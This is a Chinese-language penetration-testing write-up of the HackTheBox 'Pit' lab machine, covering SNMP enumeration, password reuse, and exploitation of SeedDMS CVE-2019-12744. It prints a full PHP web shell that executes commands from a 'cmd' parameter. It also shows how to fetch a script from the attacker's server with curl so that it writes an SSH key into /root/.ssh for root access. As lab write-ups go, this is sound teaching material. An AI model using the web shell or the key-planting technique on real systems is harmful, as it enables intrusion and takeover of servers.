> 原文链接: https://www.anquanke.com//post/id/248891 


# Hackthebox-Pit靶机渗透笔记


                                阅读量   
                                **15406**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t016de78738b9b05e4b.png)](https://p2.ssl.qhimg.com/t016de78738b9b05e4b.png)

> 目标IP：10.10.10.241
本机IP：10.10.16.12

## 前言

本文主要想记录一下对HackTheBox靶机Pit的渗透过程，涉及以下知识点：

1.snmp和snmpwalk工具使用

2.CVE-2019-12744

3.利用本地环境写入authorized_keys文件实现ssh免密登录root

难度中上，文中如果表述或者操作有问题欢迎各位师傅指出



## 信息收集

**nmap**

[![](https://p3.ssl.qhimg.com/t01e87da371f0dd6363.png)](https://p3.ssl.qhimg.com/t01e87da371f0dd6363.png)

开放了22、80、9090端口，还是从80端口开始看

访问`10.10.10.241:80`只是个Nginx服务器搭建成功界面，没有可以利用的点

[![](https://p2.ssl.qhimg.com/t01a39b3cdc983953a1.png)](https://p2.ssl.qhimg.com/t01a39b3cdc983953a1.png)

再看下9090端口，nmap扫出来一个`Zeus-admin?`去google一下，没有文章写的很清楚。

[![](https://p4.ssl.qhimg.com/t0162f987a6b62c5ef5.png)](https://p4.ssl.qhimg.com/t0162f987a6b62c5ef5.png)

查看源码发现了有用信息

[![](https://p4.ssl.qhimg.com/t011fd93f8efdd3d292.png)](https://p4.ssl.qhimg.com/t011fd93f8efdd3d292.png)

9090端口装了Cockpit

> Linux Cockpit 是一个基于Web 界面的应用，它提供了对系统的图形化管理。 … 它是一个用户友好的基于web 的控制台，提供了一些非常简单的方法来管理Linux 系统—— 通过web。 你可以通过一个非常简单的web 来监控系统资源、添加或删除帐户、监控系统使用情况、关闭系统以及执行其他一些其他任务。

在[exp库](https://www.exploit-db.com/)上看看有没有Cockpit的漏洞exp可利用，但是在源码中没有找到关于Cockpit的版本信息 暂时放一放

[![](https://p5.ssl.qhimg.com/t0177b1ed162138fe35.png)](https://p5.ssl.qhimg.com/t0177b1ed162138fe35.png)

还找到了域名**dms-pit.htb**和**pit.htb** 加入到`/etc/hosts`里方便解析域名

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f7f85273c000411f.png)

尝试用**[Gobuster](https://github.com/OJ/gobuster)**工具进行目录扫描，没有有用的发现

```
gobuster dir -u http://dms-pit.htb/ -w /usr/share/wordlists/dirb/big.txt -t 200 --wildcard
```

[![](https://p4.ssl.qhimg.com/t011f84b8fcf690598d.png)](https://p4.ssl.qhimg.com/t011f84b8fcf690598d.png)

做到这里我没思路了，nmap端口扫描的默认协议为TCP，实际上应该扫描一下UDP端口就有思路继续做下去了，还是经验不足吧

这里卡壳了去看了下官推给的提示

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017162e19b9493eb1a.png)

这个提示我自认为不是很明显，后来找了半天原来是snmpwalk的意思

> snmpwalk是SNMP的一个工具，它使用SNMP的GETNEXT请求查询指定OID（SNMP协议中的对象标识）入口的所有OID树信息，并显示给用户。通过snmpwalk也可以查看支持SNMP协议（可网管）的设备的一些其他信息，比如cisco交换机或路由器IP地址、内存使用率等，也可用来协助开发SNMP功能。
在日常监控中,经常会用到snmp服务,而snmpwalk命令则是采集系统各种信息最有效的方法。

**什么是snmp？**

> **SNMP**是英文”**Simple Network Management Protocol**“的缩写，中文意思是”**简单网络管理协议**“。**SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。由于SNMP协议简单可靠 ，受到了众多厂商的欢迎，成为了目前最为广泛的网管协议。**
SNMP 和 UDP
SNMP采用UDP协议在管理端和agent之间传输信息。 SNMP采用UDP 161端口接收和发送请求，162端口接收trap，执行SNMP的设备缺省都必须采用这些端口。SNMP消息全部通过UDP端口161接收，只有Trap信息采用UDP端口162。

那接下来我们应该就是通过snmpwalk得到某些信息继续做下去了

扫描发现161和162端口开放

[![](https://p4.ssl.qhimg.com/t0188660964da74eb89.png)](https://p4.ssl.qhimg.com/t0188660964da74eb89.png)

通过[工具](https://github.com/dheiland-r7/snmp)从目标系统中提取SNMP数据

```
snmpbw.pl target community timeout threads
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ede98fbd2927323d.png)

得到`10.10.10.241.snmp`文件，从中发现

> Linux版本：Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64
很多目录
username：michelle

[![](https://p5.ssl.qhimg.com/t0143646c3949870620.png)](https://p5.ssl.qhimg.com/t0143646c3949870620.png)

[![](https://p4.ssl.qhimg.com/t018657b565f3c7f817.png)](https://p4.ssl.qhimg.com/t018657b565f3c7f817.png)

搜一下seeddms，发现SeedDMS是个文档管理系统

访问`http://dms-pit.htb/seeddms51x/seeddms`

[![](https://p4.ssl.qhimg.com/t01cd2376b2fc5d0dde.png)](https://p4.ssl.qhimg.com/t01cd2376b2fc5d0dde.png)

用`michelle`这个用户测试登录，简单测试了几个密码发现密码就是用户名，成功登录SeedDMS

其中发现了一个更新日志，管理员把SeedDMS的版本从5.1.10升级到了5.1.15，CHANGELOG中也显示最后的更新记录升级到了5.1.15版本，去[exp库](https://www.exploit-db.com/)看看有无可利用的漏洞

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ccd0cd51447f6576.png)

可能是官方设计的时候出了问题，整合目前可以得到的所有信息，这台机子的渗透已经做不下去了，如果真和更新日志里写的一样，5.1.15版本没有已知可用的exp。

看了几篇国外大佬的博客，做到这普遍存在一个疑问就是：日志中明确写到5.1.11版本修复了 CVE-2019-12744，为什么这里CVE-2019-12744的exp还是可以利用?

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010aeab07a7e2ec367.png)

没办法，就当5.1.10版本继续做下去



## 漏洞利用

用CVE-2019-12744的exp可以实现**远程命令执行**

**参链**：[https://www.exploit-db.com/exploits/47022](https://www.exploit-db.com/exploits/47022)

SeedDMS中进入**michelle**用户目录下添加`1.php`文档并上传本地的`backdoor.php`,内容如下

```
//backdoor.php
&lt;?php

if(isset($_REQUEST['cmd']))`{`
        echo "&lt;pre&gt;";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "&lt;/pre&gt;";
        die;
`}`

?&gt;
```

[![](https://p1.ssl.qhimg.com/t01562dee6e2efd3391.png)](https://p1.ssl.qhimg.com/t01562dee6e2efd3391.png)

添加成功以后，看一下`1.php`的文档id(URL中可一看到document_id=xxx)，接下来可以通过cmd传参执行远程命令了

```
http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd= 
#我的1.php文档ID是30 
#这里的“data”和“1048576”是保存上传文件的默认文件夹。
```

查看下`/etc/passwd`

[![](https://p1.ssl.qhimg.com/t01b7bc45e432ac36c7.png)](https://p1.ssl.qhimg.com/t01b7bc45e432ac36c7.png)

浏览目录文件在`/var/www/html/seeddms51x/conf`目录下发现了配置文件`settings.xml`

```
http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=ls /var/www/html/seeddms51x/conf
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ebb6a74d3d04744b.png)

**settings.xml**

```
&lt;pre&gt;&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;configuration&gt;
  &lt;site&gt;
    &lt;!-- siteName: Name of site used in the page titles. Default: SeedDMS
       - footNote: Message to display at the bottom of every page
       - printDisclaimer: if true the disclaimer message the lang.inc files will be print on the bottom of the page
       - language: default language (name of a subfolder in folder "languages")
       - theme: default style (name of a subfolder in folder "styles")
    --&gt;
    &lt;display siteName="SeedDMS" footNote="SeedDMS free document management system - www.seeddms.org" printDisclaimer="true" language="en_GB" theme="bootstrap" previewWidthList="40" previewWidthDetail="100" availablelanguages="" showFullPreview="false" convertToPdf="false" previewWidthMenuList="40" previewWidthDropFolderList="100" maxItemsPerPage="0" incItemsPerPage="0"&gt;  
    &lt;/display&gt;
    &lt;!-- strictFormCheck: Strict form checking. If set to true, then all fields in the form will be checked for a value. If set to false, then (most) comments and keyword fields become optional. Comments are always required when submitting a review or overriding document status.
       - viewOnlineFileTypes: files with one of the following endings can be viewed online (USE ONLY LOWER CASE CHARACTERS)
       - enableConverting: enable/disable converting of files
       - enableEmail: enable/disable automatic email notification
       - enableUsersView: enable/disable group and user view for all users
       - enableFullSearch: false to don't use fulltext search
       - enableLanguageSelector: false to don't show the language selector after login
       - enableClipboard: false to hide the clipboard
       - enableFolderTree: false to don't show the folder tree
       - expandFolderTree: 0 to start with tree hidden
       -                   1 to start with tree shown and first level expanded
       -                   2 to start with tree shown fully expanded     
       - stopWordsFile: path to stop word file for indexer
       - sortUsersInList: how to sort users in lists ('fullname' or '' (default))
    --&gt;   
    &lt;edition strictFormCheck="false" viewOnlineFileTypes=".txt;.text;.html;.htm;.xml;.pdf;.gif;.png;.jpg;.jpeg" enableConverting="true" enableEmail="true" enableUsersView="true" enableFullSearch="true" enableClipboard="false" enableFolderTree="true" expandFolderTree="1" enableLanguageSelector="true" stopWordsFile="" sortUsersInList="" enableDropUpload="false" enableRecursiveCount="false" maxRecursiveCount="0" enableThemeSelector="false" fullSearchEngine="sqlitefts" sortFoldersDefault="u" editOnlineFileTypes="" enableMenuTasks="false" enableHelp="false" defaultSearchMethod="database" libraryFolder="0" maxSizeForFullText="0" showSingleSearchHit="false" enableSessionList="false" enableDropFolderList="false" enableMultiUpload="false" defaultDocPosition="end"&gt;
    &lt;/edition&gt; 
    &lt;!-- enableCalendar: enable/disable calendar
       - calendarDefaultView: calendar default view ("w" for week,"m" for month,"y" for year)
       - firstDayOfWeek: first day of the week (0=sunday, 6=saturday)
    --&gt;  
    &lt;calendar enableCalendar="true" calendarDefaultView="y" firstDayOfWeek="0"&gt;
    &lt;/calendar&gt;
  &lt;webdav enableWebdavReplaceDoc="true"/&gt;&lt;/site&gt;

  &lt;system&gt;
    &lt;!-- rootDir: Path to where SeedDMS is located
       - httpRoot: The relative path in the URL, after the domain part. Do not include the
       -           http:// prefix or the web host name. e.g. If the full URL is
         -           http://www.example.com/seeddms/, set $_httpRoot = "/seeddms/".
         -           If the URL is http://www.example.com/, set $_httpRoot = "/".
       - contentDir: Where the uploaded files are stored (best to choose a directory that
       -             is not accessible through your web-server)
       - stagingDir: Where partial file uploads are saved
       - luceneDir: Where the lucene fulltext index iѕ saved
       - logFileEnable: set false to disable log system
       - logFileRotation: the log file rotation (h=hourly, d=daily, m=monthly)
       - enableLargeFileUpload: support for jumploader
       - partitionsize: size of chunk uploaded by jumploader
       - dropFolderDir: where files for document upload are located
       - cacheDir: where the preview images are saved
    --&gt;
    &lt;server rootDir="/var/www/html/seeddms51x/seeddms/" httpRoot="/seeddms51x/seeddms/" contentDir="/var/www/html/seeddms51x/data/" stagingDir="/var/www/html/seeddms51x/data/staging/" luceneDir="/var/www/html/seeddms51x/data/lucene/" logFileEnable="true" logFileRotation="d" enableLargeFileUpload="false" partitionSize="2000000" cacheDir="/var/www/html/seeddms51x/data/cache/" dropFolderDir="" backupDir="" repositoryUrl="" maxUploadSize="" enableXsendfile="false"&gt;
    &lt;/server&gt;

    &lt;!-- enableGuestLogin: If you want anybody to login as guest, set the following line to true
       -                   note: guest login should be used only in a trusted environment
             - enablePasswordForgotten: Allow users to reset their password
       - restricted: Restricted access: only allow users to log in if they have an entry in the local database (irrespective of successful authentication with LDAP).
       - enableUserImage: enable users images
       - disableSelfEdit: if true user cannot edit his own profile
             - passwordStrength: minimum strength of password, set to 0 to disable
             - passwordExpiration: number of days after password expires
             - passwordHistory: number of remembered passwords
             - passwordStrengthAlgorithm: algorithm used to calculate password strenght (simple or advanced)
             - encryptionKey: arbitrary string used for creating identifiers
    --&gt;    
    &lt;authentication enableGuestLogin="false" enablePasswordForgotten="false" restricted="true" enableUserImage="false" disableSelfEdit="false" passwordStrength="0" passwordStrengthAlgorithm="simple" passwordExpiration="10" passwordHistory="0" loginFailure="0" autoLoginUser="0" quota="0" undelUserIds="" encryptionKey="cfecb42d13f2e1666cddde56991a2cbf" cookieLifetime="0" enableGuestAutoLogin="false" defaultAccessDocs="0"&gt;
      &lt;connectors&gt;
        &lt;!-- ***** CONNECTOR LDAP  *****
           - enable: enable/disable connector
           - type: type of connector ldap / AD
           - host: hostname of the authentification server
           -       URIs are supported, e.g.: ldaps://ldap.host.com
           - port: port of the authentification server
           - baseDN: top level of the LDAP directory tree
        --&gt;  
        &lt;connector enable="false" type="ldap" host="ldaps://ldap.host.com" port="389" baseDN="" bindDN="" bindPw=""&gt;
        &lt;/connector&gt;
        &lt;!-- ***** CONNECTOR Microsoft Active Directory  *****
           - enable: enable/disable connector
           - type: type of connector ldap / AD
           - host: hostname of the authentification server
           - port: port of the authentification server
           - baseDN: top level of the LDAP directory tree
           - accountDomainName: sample: example.com
        --&gt;  
        &lt;connector enable="false" type="AD" host="ldap.example.com" port="389" baseDN="" accountDomainName="example.com" bindDN="" bindPw=""&gt;
        &lt;/connector&gt;
      &lt;/connectors&gt;
    &lt;/authentication&gt;
    &lt;!--
       - dbDriver: DB-Driver used by adodb (see adodb-readme)
       - dbHostname: DB-Server
       - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)
       - dbUser: username for database-access
       - dbPass: password for database-access
    --&gt;    
    &lt;database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false"&gt;
    &lt;/database&gt;
    &lt;!-- smtpServer: SMTP Server hostname
       - smtpPort: SMTP Server port
       - smtpSendFrom: Send from
    --&gt;    
    &lt;smtp smtpServer="localhost" smtpPort="25" smtpSendFrom="seeddms@localhost" smtpUser="" smtpPassword=""/&gt;    
  &lt;/system&gt;


  &lt;advanced&gt;
    &lt;!-- siteDefaultPage: Default page on login. Defaults to out/out.ViewFolder.php
       - rootFolderID: ID of root-folder (mostly no need to change)
       - titleDisplayHack: Workaround for page titles that go over more than 2 lines.
    --&gt;  
    &lt;display siteDefaultPage="" rootFolderID="1" titleDisplayHack="true" showMissingTranslations="false"&gt;
    &lt;/display&gt;
    &lt;!-- guestID: ID of guest-user used when logged in as guest (mostly no need to change)
       - adminIP: if enabled admin can login only by specified IP addres, leave empty to avoid the control
       -          NOTE: works only with local autentication (no LDAP)
    --&gt; 
    &lt;authentication guestID="2" adminIP=""&gt;
    &lt;/authentication&gt;
    &lt;!-- enableAdminRevApp: false to don't list administrator as reviewer/approver
       - versioningFileName: the name of the versioning info file created by the backup tool
       - workflowMode: 'traditional' or 'advanced'
       - enableVersionDeletion: allow to delete versions after approval
       - enableVersionModification: allow to modify versions after approval
       - enableDuplicateDocNames: allow duplicate names in a folder
    --&gt; 
    &lt;edition enableAdminRevApp="false" versioningFileName="versioning_info.txt" workflowMode="traditional" enableVersionDeletion="true" enableVersionModification="true" enableDuplicateDocNames="true" enableOwnerRevApp="false" enableSelfRevApp="false" presetExpirationDate="" overrideMimeType="false" initialDocumentStatus="0" enableAcknowledgeWorkflow="" enableRevisionWorkflow="" advancedAcl="false" enableUpdateRevApp="false" removeFromDropFolder="false" allowReviewerOnly="false"&gt;
    &lt;/edition&gt;
        &lt;!-- enableNotificationAppRev: true to send notifation if a user is added as a reviewer or approver
        --&gt;
    &lt;notification enableNotificationAppRev="true" enableOwnerNotification="false" enableNotificationWorkflow="false"&gt;
    &lt;/notification&gt;
    &lt;!-- coreDir: Path to SeedDMS_Core (optional)
       - luceneClassDir: Path to SeedDMS_Lucene (optional)
       - contentOffsetDir: To work around limitations in the underlying file system, a new 
       -                   directory structure has been devised that exists within the content 
       -                   directory ($_contentDir). This requires a base directory from which 
       -                   to begin. Usually leave this to the default setting, 1048576, but can 
       -                   be any number or string that does not already exist within $_contentDir.    
       - maxDirID: Maximum number of sub-directories per parent directory. Default: 0, use 31998 (maximum number of dirs in ext3) for a multi level content directory.
       - updateNotifyTime: users are notified about document-changes that took place within the last "updateNotifyTime" seconds
       - extraPath: Path to addtional software. This is the directory containing additional software like the adodb directory, or the pear Log package. This path will be added to the php include path
    --&gt;
    &lt;server coreDir="" luceneClassDir="" contentOffsetDir="1048576" maxDirID="0" updateNotifyTime="86400" extraPath="/var/www/html/seeddms51x/pear/" maxExecutionTime="30" cmdTimeout="10"&gt;
    &lt;/server&gt;
    &lt;converters target="fulltext"&gt;
         &lt;converter mimeType="application/pdf"&gt;pdftotext -nopgbrk %s - | sed -e 's/ [a-zA-Z0-9.]\`{`1\`}` / /g' -e 's/[0-9.]//g'&lt;/converter&gt;
     &lt;converter mimeType="application/msword"&gt;catdoc %s&lt;/converter&gt;
     &lt;converter mimeType="application/vnd.ms-excel"&gt;ssconvert -T Gnumeric_stf:stf_csv -S %s fd://1&lt;/converter&gt;
     &lt;converter mimeType="audio/mp3"&gt;id3 -l -R %s | egrep '(Title|Artist|Album)' | sed 's/^[^:]*: //g'&lt;/converter&gt;
     &lt;converter mimeType="audio/mpeg"&gt;id3 -l -R %s | egrep '(Title|Artist|Album)' | sed 's/^[^:]*: //g'&lt;/converter&gt;
     &lt;converter mimeType="text/plain"&gt;cat %s&lt;/converter&gt;
    &lt;/converters&gt;

  &lt;/advanced&gt;

&lt;extensions&gt;&lt;extension name="example"/&gt;&lt;/extensions&gt;&lt;/configuration&gt;
&lt;/pre&gt;
```

其中发现了数据库的账号密码

```
&lt;database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false"&gt;
```

但是`/etc/passwd`中mysql为`/sbin/nologin`，解释如下：

> <pre><code class="hljs coffeescript">If  the file /etc/nologin exists and is readable, login(1) will allow access only to root.
Other users will be shown the contents of this file and  their  logins  will  be  refused.
This provides a simple way of temporarily disabling all unprivileged logins.
</code></pre>

就是禁止以账户的的方式登录，通常由许多需要账户但不想通过授予登陆访问权限而造成安全问题的系统服务器使用，那这里没法通过**远程命令执行**用数据库账号密码来查询数据了

上面我们已经知道9090端口可以登录Cockpit，且**root**和**michelle**两个用户使用`/bin/bash`，结合Cockpit控制台的作用，我们尝试用`username:michelle/password:ied^ieY6xoquu`登录cockpit，成功登录！

在**Accounts**中，发现确实存在**root**和**michelle**两个用户

[![](https://p3.ssl.qhimg.com/t01f47af15be0d17a57.png)](https://p3.ssl.qhimg.com/t01f47af15be0d17a57.png)

用Cockpit自带的终端找到user.txt



## 提权

先用`sudo -l`列出目前用户可执行与无法执行的指令，发现**michelle**用户不能执行`sudo`命令，另寻他法

[![](https://p4.ssl.qhimg.com/t01ee7e2ad44ce6c89f.png)](https://p4.ssl.qhimg.com/t01ee7e2ad44ce6c89f.png)

回到snmp文件，发现`/usr/bin/monitor`,monitor是一个文件，用`cat`命令看看写了啥

[![](https://p2.ssl.qhimg.com/t015e5d64cdcc744abf.png)](https://p2.ssl.qhimg.com/t015e5d64cdcc744abf.png)

[![](https://p2.ssl.qhimg.com/t012a93131c2df9e192.png)](https://p2.ssl.qhimg.com/t012a93131c2df9e192.png)

进入`/usr/local/monitoring`目录，可以看但我们只有`wx`权限。向目录写入一个脚本文件，`cat`以后成功输出了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e0255eb4c9049df4.png)

结合在**Accounts**中的发现，我们可以向`/root/.ssh`写入一个密钥来绕过SSH密码登录root账户

[![](https://p5.ssl.qhimg.com/t018683d2f554c27b9a.png)](https://p5.ssl.qhimg.com/t018683d2f554c27b9a.png)

在本地生成一对密钥，会产生**xxx.pub**和**xxx**两个文件

[![](https://p1.ssl.qhimg.com/t012843c7e5e1b195f4.png)](https://p1.ssl.qhimg.com/t012843c7e5e1b195f4.png)

[![](https://p0.ssl.qhimg.com/t010cb828ed5ed4ccb2.png)](https://p0.ssl.qhimg.com/t010cb828ed5ed4ccb2.png)

写一个shell脚本来写入我们的密钥

[![](https://p4.ssl.qhimg.com/t01d78113331cc97d1c.png)](https://p4.ssl.qhimg.com/t01d78113331cc97d1c.png)

在本地一起个web服务`python -m http.server 80`，并在Cockpit终端中用`curl`命令来获取本地的shell脚本，用`cat`执行脚本

[![](https://p2.ssl.qhimg.com/t01bb7eaeb1b169db26.png)](https://p2.ssl.qhimg.com/t01bb7eaeb1b169db26.png)

用snmpwalk加载所有内容

```
snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects
#-m MIB[:...]          load given list of MIBs (ALL loads everything)
```

[![](https://p1.ssl.qhimg.com/t01f8b024206db828ef.png)](https://p1.ssl.qhimg.com/t01f8b024206db828ef.png)

接下来就可以用配对的密钥SSH连接root了，得到root.txt

[![](https://p1.ssl.qhimg.com/t0169e0db92dba09e60.png)](https://p1.ssl.qhimg.com/t0169e0db92dba09e60.png)

写入密钥并连接的操作需要连贯的完成，因为目标Linux会定时删除`/monitoring`目录下的文件

**注意！！运行snmpwalk前需要安装配置好snmp**

```
apt-get install snmp
cpan -i NetAddr::IP
apt-get install snmp-mibs-downloader
sudo download-mibs
```



## 写在最后

总的做下来是学到了新知识的，以后信息收集的时候也会注意更多小细节

在SeedDMS版本漏洞利用的点上是官方设计的问题，有文章没解释就说这里应该用**CVE-2019-12744的漏洞**我觉得这是非常不负责任的一件事情，我们应该抱着质疑的态度而不是文章怎么写就照着做



## 参考链接

[https://www.poftut.com/snmpwalk-command-line-examples/](https://www.poftut.com/snmpwalk-command-line-examples/)

[https://blog.csdn.net/dongwuming/article/details/9705595](https://blog.csdn.net/dongwuming/article/details/9705595)
